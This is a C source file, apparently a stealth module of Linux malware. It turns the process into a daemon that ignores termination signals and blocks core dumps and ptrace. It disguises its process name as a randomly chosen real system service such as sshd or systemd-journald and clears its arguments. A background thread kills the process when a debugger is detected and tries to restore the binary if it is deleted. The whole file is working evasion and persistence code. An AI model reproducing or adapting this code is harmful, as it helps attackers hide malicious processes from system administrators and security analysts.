#define _GNU_SOURCE

#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <fcntl.h>
#include <syslog.h>
#include <string.h>
#include <sys/prctl.h>
#include <stdint.h>
#include <stdio.h>
#include <time.h>
#include <ctype.h>
#include <dirent.h>
#include <sys/mount.h>

#include <pthread.h>
#include "headers/hide.h"

#ifndef PR_SET_PTRACER
#define PR_SET_PTRACER 0x59616d61
#endif

static unsigned int g_rand_state;

static void init_rand(void) {
    g_rand_state = (unsigned int)((uint64_t)time(NULL) ^ (uint64_t)getpid() ^ (uint64_t)(uintptr_t)pthread_self());
}

static unsigned int rand_next(void) {
    g_rand_state ^= g_rand_state << 13;
    g_rand_state ^= g_rand_state >> 17;
    g_rand_state ^= g_rand_state << 5;
    return g_rand_state;
}

static const char *service_list[] = {
    "/lib/systemd/systemd-journald",
    "/lib/systemd/systemd-udevd",
    "/usr/lib/accountsservice/accounts-daemon",
    "/usr/lib/snapd/snapd",
    "/usr/lib/upower/upowerd",
    "/usr/lib/packagekit/packagekitd",
    "/usr/lib/policykit-1/polkitd",
    "/usr/lib/fwupd/fwupd",
    "/usr/lib/boltd/boltd",
    "/usr/lib/udisks2/udisksd",
    "/usr/sbin/cron",
    "/usr/sbin/rsyslogd",
    "/usr/sbin/sshd",
    "/usr/sbin/NetworkManager",
    "/usr/sbin/cupsd",
    "/usr/bin/dbus-daemon"
};

static void *defender_thread(void *arg);

void create_daemon() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (setsid() < 0) exit(EXIT_FAILURE);

    signal(SIGHUP, SIG_IGN);

    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    if (chdir("/") != 0) exit(EXIT_FAILURE);
    umask(0);

    for (int i = 0; i < sysconf(_SC_OPEN_MAX); i++)
        close(i);

    int fd = open("/dev/null", O_RDWR);
    if (fd != -1) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if (fd > STDERR_FILENO) close(fd);
    }
}

void hide(int argc, char **argv) {
    create_daemon();
    init_rand();

    sigset_t sigs;
    sigemptyset(&sigs);
    sigaddset(&sigs, SIGINT);
    sigprocmask(SIG_BLOCK, &sigs, NULL);
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGINT, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGALRM, SIG_IGN);
    signal(SIGTRAP, SIG_IGN);
    signal(SIGURG, SIG_IGN);
    signal(SIGQUIT, SIG_IGN);

    prctl(PR_SET_DUMPABLE, 0);
    prctl(PR_SET_PTRACER, 0);

    const int total = sizeof(service_list) / sizeof(service_list[0]);
    const char *new_name = service_list[rand_next() % total];

    prctl(PR_SET_NAME, (unsigned long)new_name);

    size_t name_len = strlen(new_name);
    size_t avail_len = strlen(argv[0]);

    if (name_len <= avail_len) {
        strncpy(argv[0], new_name, avail_len);
    } else {
        strncpy(argv[0], new_name, avail_len - 1);
        argv[0][avail_len - 1] = '\0';
    }

    for (int i = 1; i < argc; i++)
        memset(argv[i], 0, strlen(argv[i]));

    pthread_t dt;
    pthread_create(&dt, NULL, defender_thread, NULL);
    pthread_detach(dt);
}

static void *defender_thread(void *arg) {
    (void)arg;
    while (1) {
        char buf[2048];
        int fd = open("/proc/self/status", O_RDONLY);
        if (fd >= 0) {
            int n = read(fd, buf, sizeof(buf)-1);
            close(fd);
            if (n > 0) {
                buf[n] = '\0';
                char *line = buf;
                while (*line) {
                    if (strncmp(line, "TracerPid:", 10) == 0) {
                        int tracer = atoi(line + 10);
                        if (tracer != 0)
                            _exit(1);
                        break;
                    }
                    char *nl = strchr(line, '\n');
                    if (nl) line = nl + 1; else break;
                }
            }
        }

        char exe[512] = {0};
        ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe)-1);
        if (len > 0) {
            exe[len] = '\0';
            if (access(exe, F_OK) != 0) {
                char r[512] = {0};
                if (readlink("/proc/self/exe", r, sizeof(r)-1) > 0) {
                    int sf = open(r, O_RDONLY);
                    if (sf >= 0) {
                        int df = open(exe, O_WRONLY|O_CREAT|O_TRUNC, 0755);
                        if (df >= 0) {
                            char copy_buf[4096];
                            int cn;
                            while ((cn = read(sf, copy_buf, sizeof(copy_buf))) > 0)
                                write(df, copy_buf, cn);
                            close(df);
                        }
                        close(sf);
                    }
                }
            }
        }

        sleep(5);
    }
    return NULL;
}
